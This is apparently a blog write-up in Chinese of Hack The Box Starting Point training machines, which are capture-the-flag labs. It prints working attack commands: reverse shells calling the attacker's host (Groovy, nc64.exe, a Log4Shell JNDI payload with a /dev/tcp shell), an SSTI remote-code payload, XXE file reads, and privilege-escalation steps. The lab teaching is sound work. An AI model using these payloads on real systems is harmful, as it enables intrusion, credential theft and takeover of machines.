---
title: "Happy Hacking: Hack The Box Starting Point"
date: 2024-01-20
tags:
  - 网络
  - SQLi
  - Linux
  - 文件上传
  - Java
  - Kali
  - 文件包含
  - 模版注入
  - Javascript
  - PHP
  - XXE
categories:
  - Web 安全
---

1st episode of playing with HTB.

<!--more-->

## Tier 0

### Meow

Telnet 服务默认使用 TCP 23 端口，root 用户可以使用空密码登录，登录后获得 flag。

### Fawn

FTP 服务默认使用 TCP 21 端口，可以使用 anonymous 用户匿名登录，登录成功返回代码 230。在 ftp 命令行中使用 `get flag.txt` 下载 flag。

### Dancing

SMB 服务默认使用 TCP 445 端口，使用 `smbclient -N -L <box_ip>` 列举目录，随后通过 `smbclient \\\\<ip>\\WorkShares` 发现 `WorkShares` 是唯一无需密码即可访问的目录。最终在 `James.P` 目录下发现 `flag.txt`，同样使用 `get` 命令即可下载。

### Redeemer

Redis 服务默认使用 TCP 6379 端口，使用 `redis-cli -h <box_ip>` 进行连接，随后运行：

```
> select 0
> keys *
> get flag
```

### Explosion

RDP 服务默认使用 TCP 3389 端口，使用管理员账号 Administrator + 空口令登录：

```bash
$ xfreerdp /v:<box_ip> /cert:ignore /u:Administrator
```

### Preignition

HTTP 服务默认使用 TCP 80 端口，响应头中发现服务器版本为 Nginx 1.14.2。使用 gobuster 进行目录扫描：

```bash
$ gobuster dir -u http://<box_ip> -w /usr/share/wordlists/dirb/common.txt
```

发现存在 `admin.php`，可以访问管理员后台但需要账号密码，使用弱口令 `admin/admin` 成功登录。

### Mongod

MongoDB 服务默认使用 TCP 27017 端口，首先安装 `mongodb-clients` 工具，随后使用 `mongo` CLI 访问数据库，找到 `flag` 这个 collection 并使用 `find` 查询数据：

```bash
$ mongo <box_ip>
...
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use sensitive_information
> show collections
flag
> db.flag.find().pretty()
```

### Synced

Rsync 服务默认使用 TCP 873 端口，直接使用 rsync 匿名认证连接：`rsync --list-only rsync://<box_ip>/`，发现 flag 在 `public` 目录下，使用 rsync 下载到本地：

```bash
$ rsync rsync://<box_ip>/public/flag.txt ./flag
```

## Tier 1

### Appointment

SQL 注入教学，使用 `'='` 作为密码即可成功登录（拼接成 `AND password=''=''`）。

### Sequel

MySQL 服务默认使用 TCP 3306 端口，使用 `mysql -u root -h <box_ip>` 进行连接，随后运行：

```sql
> show databases;
> use htb;
> show tables;
> select * from config;
```

### Crocodile

通过 FTP 匿名登录获得敏感账号密码：`admin/rKXM59ESxesUFHAd`，通过 nmap 发现主机开放 80 端口，`gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php` 可以发现存在 `/login.php`，用刚才得到的账号密码即可登录。

### Responder

浏览器访问 Box 的 IP 会跳转到 unika.htb，此时可能需要修改 hosts 才能正常访问网页，如果浏览器中有 SwitchyOmega 之类的插件还需要设置成直接连接模式。

通过语言切换页面的 URL 发现使用的是 PHP，参数 `page` 疑似存在文件包含漏洞。尝试本地文件包含成功：

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

随后启动 Responder：`sudo responder -I tun0 -wd`，并触发远程文件包含：

```
http://unika.htb/index.php?page=//<my_ip>/somefile
```

此时服务器通过 SMB 访问 Responder 服务，带出 Administrator 用户的 NTLMv2 哈希。最后用 john 爆破哈希：

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

获得 Administrator 密码 `badminton`。随后对 Box 进行端口扫描，发现 5985 端口开放，这是 Windows 远程管理服务（WinRM）的端口。使用 evil-winrm 连接即可获得 shell：

```bash
$ evil-winrm -i <box_ip> -u Administrator -p badminton
```

### Three

修改 hosts 之后，需要使用 gobuster 的 vhost 模式以及 `--append-domain` flag 进行子域名爆破：

```bash
$ gobuster vhost -u http://thetoppers.htb -w amass/subdomains-top1mil-5000.txt --append-domain thetoppers.htb
```

发现存在子域名 `s3.thetoppers.htb`，添加解析后利用 AWS CLI 列举 S3 Buckets，发现存在 `thetoppers.htb` Bucket，随后再列举文件：

```bash
$ aws configure
# ...
$ aws --endpoint http://s3.thetoppers.htb s3 ls
$ aws --endpoint http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

可以发现网站采用 PHP 编写，利用 AWS CLI 上传 Webshell 即可取得控制权：

```bash
$ aws --endpoint http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

### Ignition

扫描发现仅 80 端口开放，浏览器访问跳转到 ignition.htb，修改 hosts 文件即可正常访问。目录爆破发现 `/admin` 是一个 Magento 后台登录页面，搜索发现 Magento 要求密码长度 >= 7 个字符，且至少包含一个字母和一个数字。根据密码要求、题目末位提示以及 [2023 最常见密码列表](https://mailsafi.com/blog/top-200-most-common-passwords/)，使用 `qwerty123` 成功登录，登录后在后台 Dashboard 页面直接获得 flag。

### Bike

扫描发现 22 和 80 端口开放，其中 80 端口上运行 Nodejs 服务，whatweb 显示采用了 Express 框架。在输入框中尝试输入内容并提交，发现会直接回显。根据题目提示提交 `{{7*7}}` 尝试模版注入发现报错，报错信息中含有模版引擎信息 handlebars。

因此，可以使用 Hacktricks 上的 [handlebars 模版注入 payload](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)，经过 URL 编码后在 Burpsuite 中发送：

```
POST / HTTP/1.1
...

email=%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D&action=Submit
```

这段 payload 的核心在于 `return require('child_process').exec('whoami');`，即使用 `require` 加载了 `child_process` 模块并执行命令。但发送后我们得到了 `ReferenceError: require is not defined` 的错误，这可能是因为模版引擎通常在沙箱中执行代码，而这个沙箱中禁用了 `require` 语法。

因此考虑其他方法，在 Node.js 文档中发现存在全局变量 `process`，其中包含了当前进程的信息，而 `process.mainModule` 会返回当前进程的主进程，而主进程是不在沙箱里的因此可以调用 `require` 。这样我们只需要把 payload 核心改为：

```js
return process.mainModule.require("child_process").execSync("whoami");
```

再发送即，注意使用 `execSync` 确保能在命令执行完后返回结果。

### Funnel

扫描发现 21 和 22 端口开放，FTP 尝试匿名登录发现可以成功。在 FTP 服务器上发现 password_policy.pdf 中存在默认密码信息，在 welcome 文件中发现多个用户名信息。用默认密码逐一尝试 SSH 登陆这些用户，发现可以成功登录 christine 用户。

或者也可以用 hydra：

```bash
$ hydra -L usernames.txt -p 'funnel123#!#' <box_ip> ssh
```

登录后检查监听端口，通过 `ss -tl` 发现 `127.0.0.1:5432` 可能运行 postgresql 服务。但是这台主机上没有安装与 postgresql 交互的 CLI 工具 `psql`，因此我们需要从本地主机连接服务。由于服务监听在 127.0.0.1，我们需要通过本地端口转发，使得发送到我们本地主机 2345 端口的流量通过 SSH 隧道转发到远程主机的 5432 端口：

```bash
$ ssh -L 2345:localhost:5432 christine@<box_ip>
```

随后就可以通过 `psql` 连接了：

```bash
$ psql -h localhost -p 2345 -U christine
> \l
> \c secrets
> \dt
> select * from flag;
```

除了使用本地端口转发外，也可以使用动态端口转发，此时本质上是在本地的 2345 端口上运行了一个 SOCKS5 代理：

```bash
$ ssh -D 2345 christine@<box_ip>
```

这样只要通过 `proxychains` 等工具走代理就能访问远程主机上的任意端口了（`proxychains` 需要在 `ProxyList` 中设置 `socks5 127.0.0.1 2345` 代理）：

```bash
$ proxychains psql -h localhost -p 5432 -U christine
```

### Pennyworth

扫描发现 8080 端口开放 Jenkins 服务，使用默认密码 `root/password` 登录。随后通过 Manage Jenkins -> Script Console 执行 [Groovy Script 反弹 shell](https://github.com/gquere/pwn_jenkins)：

```groovy
String host="<my_ip>";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Tactics

445 端口开放，使用 `smbclient -U Administrator -L <box_ip>` 加空密码访问 SMB 服务，发现 `ADMIN$` 和 `C$` 这两个 Share 都可以访问 。随后我们可以直接访问 C 盘获取 flag：

```bash
$ smbclient -U Administrator \\\\<box_ip>\\C$
> cd Users\Administrator\Desktop
> get flag.txt
```

或者，由于可以访问 `ADMIN$`，我们也可以用 impacket 的 psexec 模块获取 shell，注意输入空密码：

```bash
$ impacket-psexec Administrator@<box_ip>
> cd C:\Users\Administrator\Desktop
> type flag.txt
```

## Tier 2

### Archetype

扫描发现 445 和 1433 端口开放，通过 `smbclient` 获取到 `prod.dtsConfig` 文件，其中包含了用户名 `sql_svc` 和 密码 `M3g4c0rp123`。随后利用 impacket 的 MSSQLClient 脚本（Kali 中可以使用 `impacket-mssqlclient`，其他脚本类似）连接 1433 端口的 SQLServer，注意使用 `-windows-auth` flag：

```bash
$ python3 mssqlclient.py sql_svc:M3g4c0rp123@<box_ip> -windows-auth
```

成功连接后，可以检查自身权限，发现属于 `sysadmin`：

```sql
> SELECT is_srvrolemember('sysadmin');
```

然后检查当前路径，发现位于 `C:\Windows\system32`：

```bash
> enable_xp_cmdshell
> xp_cmdshell "powershell -c pwd"
```

在本机上启动服务器用于给靶机下载 `nc64.exe`，注意切换靶机目录：

```bash
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<my_ip>:8000/nc64.exe -outfile nc64.exe"
```

随后实施反弹 shell，可以在 Desktop 目录下获得 user flag：

```bash
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <my_ip> 1337"
```

获取 shell 后故技重施，下载 winPEAS 并运行，发现存在命令行历史文件 `ConsoleHost_history.txt`，查看文件内容得到 Administrator 密码 `MEGACORP_4dm1n!!`：

```powershell
$ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

最后通过 impacket 的 `psexec` 脚本获取 Administrator shell：

```bash
$ impacket-psexec Administrator:MEGACORP_4dm1n\!\!@<box_ip>
```

### Oopsie

Burpsuite 爬虫发现存在登录 URL `/cgi-bin/login`，首先以 guest 身份登录，在 Account 页面发现 URL 中含有参数 `id=2`，修改为 1 后可以获得 `admin` 用户的 Access ID 34322。在 Upload 页面发现访问页面需要 admin 权限，抓包可以看到 Cookie 中可以设置 `user` 和 `role` 两项，对应 Access ID 和用户名，填入 `admin` 的即可。

继续使用 `admin` 的 cookie 上传 webshell，随后爆破目录发现上传的文件位于 `/uploads` 即可访问 webshell。随后反弹 shell 并在 `/var/www/html/cdn-cgi/login` 下发现存有数据库密码的 `db.php`：

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

此外，通过 `grep -ri passw*` 还能在 index.php 中发现 `admin` 用户的密码：

```php
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
```

通过 `/etc/passwd` 发现系统中同样存在 `robert` 用户，因此可以尝试用 `M3g4C0rpUs3r!` 切换到 `robert` 用户，并在用户 home 目录下发现 user flag。随后通过 `id` 发现 `robert` 用户属于 `bugtracker` 组，查找所有该组用户拥有的文件：

```bash
$ find / -group bugtracker 2>/dev/null
```

可以发现一个 SUID 可执行文件 `/usr/bin/bugtracker`。尝试执行：

```bash
$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 11
11
---------------

cat: /root/reports/11: No such file or directory
```

可以发现它会接收用户输入，将其拼接到 `/root/reports` 后面然后用 `cat` 读取。那么一个简单的提权思路就是修改环境变量，使 `cat` 命令指向我们自定义的 `cat` 脚本，在脚本中启动 shell 即可：

```bash
$ cd /tmp
$ echo "/bin/sh" > cat
$ chmod +x cat
$ export PATH=/tmp:$PATH
$ /usr/bin/bugtracker
```

### Vaccine

通过 FTP 下载压缩包，破解压缩包密码：

```bash
$ zip2john backup.zip > hashes
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

获得密码 `741852963`，随后在 index.php 中发现 `admin` 用户的密码 MD5 `2cb42f8734ea607eefed3b70af13bbd3`，使用 hashcat 指定 MD5 算法并破解得到密码明文：`qwerty789`：

```bash
$ echo 2cb42f8734ea607eefed3b70af13bbd3 > hash
$ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt
```

登录网站发现搜索框存在 SQL 注入，准备好 cookie 后用 sqlmap 跑一下：

```bash
$ sqlmap -u "http://<box_ip>/dashboard.php?search=1" --cookie="PHPSESSID=jfqqop7f3lv6d7qat8973gfsag"
```

发现 `search` 参数可以注入，加上 `--os-shell` flag 再跑一次即可获得 shell，随后反弹 shell 即可获得 `postgres` 用户的 user flag。

随后在 `/var/www/html` 目录下用 `grep -ri` 搜索发现数据库 `postgres` 用户的明文密码 `P@s5w0rd!`，测试发现同样是 Linux 用户 `postgres` 的密码。`sudo -l` 查看权限，可以执行 `/bin/vi /etc/postgresql/11/main/pg_hba.conf`，在 [GTFO Bins](https://gtfobins.github.io/gtfobins/vi/) 上可以找到相关利用方式，由于执行的命令和参数是固定的，必须先执行：

```bash
$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

进入 vi 编辑器，随后在普通模式下再运行：

```
:set shell=/bin/sh
:shell
```

或者也可以直接运行 `:!/bin/bash`。

### Unified

扫描发现 22,6789,8080,8443 端口开放，其中 8443 端口对应服务为 Unifi 6.4.54，搜索发现存在 [CVE-2021-44228](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) 漏洞。在这个漏洞中，我们需要在登陆请求的 `remember` 参数中注入 JNDI payload，让 Unifi 服务请求我们控制的恶意 LDAP 服务。

为了启动恶意 LDAP 服务，首先安装和编译 Rogue JNDI：

```bash
$ sudo apt install -y openjdk-11-jdk maven
$ git clone https://github.com/veracode-research/rogue-jndi
$ cd rogue-jndi
$ mvn package
```

随后构造 payload，并进行 Base64 编码，提供给 Rogue JNDI 启动恶意 JNDI 服务器：

```bash
$ rev_sh=$(echo 'bash -c bash -i >&/dev/tcp/<my_ip>/1337 0>&1' | base64)
$ java -jar target/RogueJndi-1.1.jar --hostname "<my_ip>" --command "bash -c {echo,$rev_sh}|{base64,-d}|{bash,-i}"
```

最后抓取登录数据包，将 `remember` 字段改为 `${jndi:ldap://<my_ip>:1389/o=tomcat}` 并发送，目标服务就会向我们的恶意 JNDI 服务器发起 LDAP 请求：

```
POST /api/login HTTP/1.1
...

{"username":"admin","password":"123456","remember":"${jndi:ldap://<my_ip>:1389/o=tomcat}","strict":true}
```

此时可以获取到反弹的 shell，将其升级为 bash：

```
script /dev/null -c bash
```

即可获得 user flag。

> 根据 Walkthrough，在启动恶意 JDNI 服务器前可以使用 tcpdump 先验证漏洞存在：`sudo tcpdump -i tun0 port 389`

随后通过 ps 发现主机上 27117 端口运行 MongoDB 服务，搜索发现 Unifi 默认数据库名为 `ace`，尝试连接并列举用户：

```bash
$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"
```

这里可以发现存在管理员账号 `administrator`，其密码哈希存于 `x-shadow` 字段。

```json
{
    "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
    "name" : "administrator",
    "email" : "administrator@unified.htb",
    "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uH
uonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
	...
}
```

我们可以使用自己生成的密码哈希替换该字段：

```bash
$ mkpasswd -m sha-512 123456
$6$kVChPiP/rENqcESK$fWp6VtrpgPDUTxstrS949DFd43I86gECz9mqD9/HuQf9G4hlDFAGKwn8mQlvlw7c4dvkQppO9vkhT4d2btnw3.
$ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$kVChPiP/rENqcESK$fWp6VtrpgPDUTxstrS949DFd43I86gECz9mqD9/HuQf9G4hlDFAGKwn8mQlvlw7c4dvkQppO9vkhT4d2btnw3."}})'
```

随后就可以在 web 界面使用 `administrator/123456` 登录 Unifi 管理后台了。在 Settings 中可以显示 SSH root 密码 `NotACrackablePassword4U2022`，通过 SSH 登录 root 用户即可获得 root flag。

### Included

扫描发现 80 端口开放，访问网站发现首页 URL 中存在文件包含特征：`?file=home.php`，尝试包含 `/etc/passwd`：

```
?file=../../../../../../etc/passwd
```

发现可以成功显示文件内容。在该文件中发现存在 `tftp` 用户，说明主机上可能存在 TFTP 服务。`nmap -sU` 扫描发现 UDP 69 端口开放，运行 TFTP 服务。[查阅](https://help.ubuntu.com/community/TFTP)发现 TFTP 无认证机制，默认文件存放位置为 `/var/lib/tftpboot/`，因此我们可以通过 TFTP 上传 Webshell，随后利用本地文件包含漏洞访问 Webshell。

```bash
$ tftp <box_ip>
> put rev_sh.php
> quit
```

然后访问：

```
?file=../../../../../../var/lib/tftpboot/rev_sh.php
```

即可获得 shell。随后在网站目录下发现 `.htpasswd`，得到用户 mike 的密码，从而得到 user flag。

`id` 发现 mike 属于 `lxd` 组，[因此](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)我们可以提权为 root。在本地打包一个 lxc 镜像：

```bash
$ sudo apt update
$ sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
$ git clone https://github.com/lxc/distrobuilder
$ cd distrobuilder
$ make
$ mkdir -p $HOME/ContainerImages/alpine/
$ cd $HOME/ContainerImages/alpine/
$ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
$ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

> 坑点：fetching https://dl-cdn.alpinelinux.org/alpine/v3.18/main: Permission denied 报错问题，是由于 fetch 在使用代理发送 HTTPS 请求时存在 bug 导致的，即使切换用户为 root 也无法解决。需要关闭代理、或使用 HTTP。

打包完成后，会生成 `incus.tar.xz` 和 `rootfs.squashfs` 两个文件，通过本地起 HTTP Server 将文件下载到靶机上，随后加载镜像并以特权模式启动容器：

```bash
$ lxc image import incus.tar.xz rootfs.squashfs --alias alpine
$ lxc image list
$ lxc init alpine privesc -c security.privileged=true
$ lxc list
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
$ lxc start privesc
$ lxc exec privesc /bin/sh
```

此时宿主机的 `/` 就被挂载到了容器的 `/mnt/root` 下，并且我们拥有容器的 root 权限，可以读取任意文件。

### Markup

扫描发现 22, 80, 443 开放，网站登录存在弱密码 `admin:password`，登录后发现 Order 页面接收用户输入，抓包可以看到请求数据通过 XML 格式发送，且 Type of Goods（对应 `item` 字段）会有回显。因此可以尝试 XXE 读文件，由于靶机为 Windows 可以读取 `C:/windows/system32/drivers/etc/hosts` 文件：

```xml
<?xml version = "1.0"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///C:/windows/system32/drivers/etc/hosts" > ]>
<order>
	<quantity>1</quantity>
	<item>&ext;</item>
	<address>123</address>
</order>
```

接下来需要寻找敏感文件。在网页源码中发现 Daniel 字样，说明可能存在该用户，尝试读取 Daniel 的 SSH 私钥：

```xml
<?xml version = "1.0"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///C:/users/daniel/.ssh/id_rsa" > ]>
<order>
	<quantity>1</quantity>
	<item>&ext;</item>
	<address>123</address>
</order>
```

此时即可 SSH 登录主机获得 user flag。随后在 `C:\Log-Management` 目录下发现 `job.bat` 文件：

```bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

这个脚本会在验证管理员权限后使用 [wevutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) 执行日志清除任务，有可能是一个定时执行的脚本，但脚本本身对我们没有帮助。我们可以修改脚本内容为反弹 shell payload，然后借助定时任务获取管理员 shell。为此，需要先检查 Daniel 对该文件的权限：

```powershell
daniel@MARKUP C:\Log-Management> icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)
```

可以发现 `BUILTIN\Users` 也就是本机上的所有用户都具备 Full 权限，因此可以在 cmd 中修改：

```powershell
daniel@MARKUP C:\Log-Management> echo C:\Log-Management\nc64.exe -e cmd.exe <my_ip> 1337 > job.bat
```

注意之后 `job.bat` 有可能被覆盖为原内容，此时需要再次用反弹 shell payload 覆盖文件，多次尝试后可以获得管理员 shell。

### Base

扫描发现 22, 80 端口开放，网站登录页面 URL 为 `/login/login.php`，直接访问 `/login` 可以发现该目录下存在三个文件，其中 `config.php` 是配置文件可能包含敏感信息，但暂时无法读取；`login.php.swp` 是 `login.php` 的备份文件，可以阅读其源码，发现关键部分如下：

```php
header("Location: /upload.php");
$_SESSION['user_id'] = 1;
if (strcmp($password, $_POST['password']) == 0) {
if (strcmp($username, $_POST['username']) == 0) {
require('config.php');
if (!empty($_POST['username']) && !empty($_POST['password'])) {
session_start();
```

根据此处代码逻辑，可以推断这里的行顺序完全颠倒了，我们可以使用 `tac` 来倒序输出：

```php
<?php
session_start();
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: /upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
```

可以看到这里使用 `strcmp()` 返回结果是否为 0 来判断用户名与密码是否合法，因此可以利用 `strcmp()` 函数传入非字符串值时返回 `NULL` 的特性，加上 `NULL == 0` 的 PHP 语言规则来通过校验：

```
POST /login/login.php HTTP/1.1
...

username[]=admin&password[]=123456
```

随后即可访问 `/upload.php` 上传文件，通过 gobuster 找到上传目录 `/_uploaded`：

```bash
$ gobuster dir -u http://<box_ip> -w /usr/share/wordlists/dirb/big.txt
```

随后即可访问上传的 Webshell。获取反弹 shell 后发现主机上存在 `john` 用户。检查 `/login/config.php`，发现网站中 `admin` 用户的密码，该密码同时也是主机上 `john` 用户的密码，因此可以获取 user flag。

`sudo -l` 发现 `john` 可以用 root 权限运行 `find` 命令，使用 `find . -exec /bin/sh \; -quit` 获取 root shell。
